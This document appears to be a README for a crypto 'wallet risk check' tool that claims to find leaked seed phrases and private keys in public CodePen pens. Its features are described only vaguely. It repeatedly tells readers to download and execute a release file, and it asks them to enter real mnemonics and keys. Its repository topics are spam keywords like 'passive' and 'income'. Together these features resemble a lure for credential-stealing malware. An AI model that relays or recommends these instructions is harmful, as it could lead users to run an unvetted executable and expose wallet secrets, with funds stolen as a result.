# Key-From-Phrase — Wallet Risk Check Tool and CodePen Guide 🔑🛡️💻

[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github)](https://github.com/iiDanier/Key-From-Phrase/releases)

![crypto-hero](https://images.unsplash.com/photo-1620119906583-2d4b7f6b2f6f?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=4b3f4bdc9b2b6f6b3c1ce07a0f6f9fd3)

A compact tool and guide to test whether a wallet phrase or derived key appears in public CodePen content. It helps you find accidental leaks, pasted keys, or demo keys that expose funds or credentials.

Badges
- Topics: arbitrage · cash · code · crypto · free · gain · guide · income · learn · open · passive · smart · source · tutorial · youtube
- License: MIT
- Platform: Browser · Node.js

Table of contents
- About
- Why this tool
- What it checks
- Quick start
- CodePen workflow
- CLI / Local usage
- Risk scoring
- Internals and algorithm
- Security and privacy practices
- Examples
- Contributing
- Releases and downloads
- License
- Contact

About
This project scans public CodePen pens and related public snippets to check for exposed wallet material. It derives addresses from a mnemonic phrase or from a raw private key and searches public content for matches. It returns a risk score and a list of matches with context links.

Why this tool
- Catch accidental leaks on demo pages and pens before an attacker finds them.
- Audit shared demos and tutorial pens for test keys left in code.
- Scan candidate phrases used in tutorials or giveaways to avoid reuse.
- Learn how public key derivation and exposure checks work.

What it checks
- Exact phrase matches in code or text.
- Derived public addresses from BIP-39/BIP-44-style mnemonics.
- Common formats: hex private keys, WIF, ETH addresses, BTC addresses, Solana keys.
- Partial matches and truncated leaks (first/last characters).
- Metadata and comments that contain keys or seeds.
- Reused test keys across pens.

Quick start
1) Visit the Release page and download the release artifact. The file on that page needs to be downloaded and executed:
https://github.com/iiDanier/Key-From-Phrase/releases

2) Unpack the release and follow the included README or run the main script. Example script names in a release:
- key-from-phrase.js
- key-from-phrase-cli.zip

3) Run in Node.js or open in a browser sandbox for quick checks:
- node key-from-phrase.js --phrase "your mnemonic here"
- Or paste the script into a CodePen to run a search in the browser sandbox.

CodePen workflow
This tool integrates with a CodePen-driven workflow. Use the following steps to run a focused test against public pens:

1. Open a new or existing pen on CodePen.
2. Paste the search helper script from the release into the JS panel.
3. Enter the mnemonic or key you want to test.
4. Run the pen. The script queries public pen content and returns matches and context.

Typical CodePen script behavior
- Read input phrase via prompt or a form element.
- Derive common addresses from the phrase.
- Call CodePen public search endpoints or fetch pen HTML pages.
- Highlight matches in the returned content.
- Present a compact report with links back to the pen and the matched snippet.

CLI / Local usage
A local run gives more control and allows a focused scan across many targets. The release includes a CLI runner. Example flows:

Install Node dependencies (if release contains package.json)
- npm install

Run the CLI
- node cli.js --phrase "seed words here" --targets codepen --depth 200

Flags
- --phrase        : mnemonic words or private key
- --targets       : list of services to scan (codepen, github, gist)
- --depth         : number of search results to fetch
- --format        : output format (json, text, markdown)
- --offline       : run address derivation without any remote calls

Risk scoring
The tool produces a numeric score and a qualitative label. The score combines:
- Direct exposure: literal phrase or private key found in public content (high weight).
- Address exposure: derived public address found (medium weight).
- Partial exposure: partial matches or truncated data (low weight).
- Context severity: exposure in JS files or live demos scores higher than a blog comment.
- Spread: how many unique pens or authors expose the key.

Labels
- Critical: direct secret match or private key found
- High: derived address appears in public demo code
- Medium: truncated or partial leak
- Low: matches only in a comment or purely descriptive text
- Clean: no matches in the scanned surface

Internals and algorithm
- Mnemonic parsing: BIP-39 wordlist support for major languages.
- Derivation: BIP-32/BIP-44 derivation paths for common chains (BTC, ETH, SOL).
- Address generation: standard encodings and checksum verification.
- Search: HTTP calls to CodePen public search endpoints and pattern matching in HTML/JS/CSS blobs.
- Matching heuristics: regex patterns for private keys, WIF, mnemonic fragments, and checksums for addresses to reduce false positives.

Security and privacy practices
- Run local scans for real, secret mnemonics. The release runs offline address derivation and only sends derived public addresses for public checks.
- Use throwaway or test phrases for online demos.
- The release file needs to be downloaded and executed from the Releases page:
https://github.com/iiDanier/Key-From-Phrase/releases
- Keep sensitive keys out of shared pens and PRs. Use environment variables for real deployments.

Examples
Example 1 — Demo mnemonic
- Input: "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
- Output: Derived ETH address: 0xAbC...123
- Matches: none in top 500 public pens
- Score: Clean

Example 2 — Demo private key left in a pen
- Input: "0x0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
- Output: Private key found in 2 public pens
- Matched files: demo.js (CodePen), index.html (CodePen)
- Score: Critical

Example 3 — Partial leak
- Input: any phrase that derives address 1A2b...
- Output: Partial match on truncated address found in a tutorial pen comment
- Score: Medium

Output formats
- JSON: machine-friendly, includes matches array with pen URLs and matched snippet.
- Markdown: human-friendly summary with links and a small code block showing the match.
- Text: compact CLI output.

Contributing
- Fork the repo.
- Create a feature branch.
- Add tests for new checks and for false positive filters.
- Open a pull request with a clear description and sample output.
- Follow the code style in the release: short functions, clear naming, and tests that run with node test.

Development checklist
- Add support for more chains and derivation paths.
- Improve partial match detection.
- Add GitHub and Gist scanning modules.
- Add rate limit handling and caching for public searches.

Releases and downloads
Download and run the release artifact from this page. The file on the Releases page needs to be downloaded and executed:
https://github.com/iiDanier/Key-From-Phrase/releases

You will find packaged scripts, a CLI runner, and a small browser script suitable for pasting into CodePen. The release asset typically includes:
- key-from-phrase.js
- key-from-phrase-cli.zip
- README.release.md
- sample-config.json

Use the release README for exact run commands and platform-specific notes. If the release link becomes unavailable, check the Releases section on the repository for the latest artifacts.

Images and assets
- Hero image from Unsplash used for theme: crypto demo.
- Icons: shields produced with img.shields.io.
- Sample screenshots: included in release as PNGs showing the report format and matched snippet highlights.

License
This project uses the MIT license. See the LICENSE file in the release package for the full text.

Contact and support
- Open issues on the repo for questions or bugs.
- Use the Releases page for download-related problems:
https://github.com/iiDanier/Key-From-Phrase/releases

Emoji legend
- 🔑 key/phrase input
- 🛡️ risk and protection
- 💻 code and demo
- 🔍 search and scan
- 📦 release downloads

Screenshots
![report-example](https://raw.githubusercontent.com/iiDanier/Key-From-Phrase/main/assets/report-sample.png)

Code snippet — browser check (example)
```js
// Paste into CodePen JS panel
const phrase = prompt('Enter test phrase');
const addrs = deriveAddresses(phrase); // included in release
scanPublicPens(addrs).then(report => {
  renderReport(report);
});
```

Common questions
- Q: Which chains does the tool support?
  A: The release ships with BTC and ETH derivation by default. Extra chains load via optional modules.

- Q: Does it expose my phrase?
  A: The release derives addresses locally and queries public endpoints only for public, derived addresses.

- Q: Can I run a mass audit?
  A: Yes. Use the CLI with a list of phrases and output JSON for later analysis.

Maintain the repository topics for discoverability:
arbitrage · cash · code · crypto · free · gain · guide · income · learn · open · passive · smart · source · tutorial · youtube

Files to expect in release
- key-from-phrase.js
- cli.js
- package.json
- LICENSE
- README.release.md
- sample-config.json
- assets/ (screenshots and icons)

Follow the release README for platform steps and sample commands. The release file needs to be downloaded and executed from:
https://github.com/iiDanier/Key-From-Phrase/releases

Report issues or request help via the repository issue tracker.